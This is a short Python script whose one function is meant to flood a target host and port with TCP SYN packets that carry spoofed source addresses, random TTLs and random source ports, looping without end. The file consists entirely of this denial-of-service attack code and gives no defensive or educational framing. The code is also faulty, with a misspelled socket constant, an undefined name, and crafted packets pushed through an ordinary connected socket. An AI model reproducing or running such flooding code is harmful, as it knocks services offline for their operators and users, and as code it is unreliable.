#!/usr/bin/env python

def sendpacket(Ip_range, destination, targetport):
    from scapy.all import IP, TCP
    import random
    import socket
    silva = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    silva.connect((destination, targetport))
    number = 1
    if type(Ip_range) != list:
        while 0 == 0:
             try:
                 silva.send(bytes(IP(dst = str(destination), src = str(Ip_range), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S")))
                 print 'Package sent' 
             except:
                 silva.shutdown(SHUT_RD)
                 silva.close()
                 silva = socket.socket(socket.AF_INet, socket.SOCK_STREAM)
                 silva.connect((destination, targetport))
        
    else: 
       while 0 == 0:
             try:
                sourceIP = random.choice(Ip_range)
                silva.send(bytes(IP(dst = str(destination), src = str(sourceIP), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S")))
                Ip_range.remove(sourceIP)
                print 'package sent'
             except:
                silva.shutdown(SHUT_RD)
                silva.close()
                silva = socket.socket(socket.AF_INet, socket.SOCK_STREAM)
                silva.connect((destination, targetport))
             
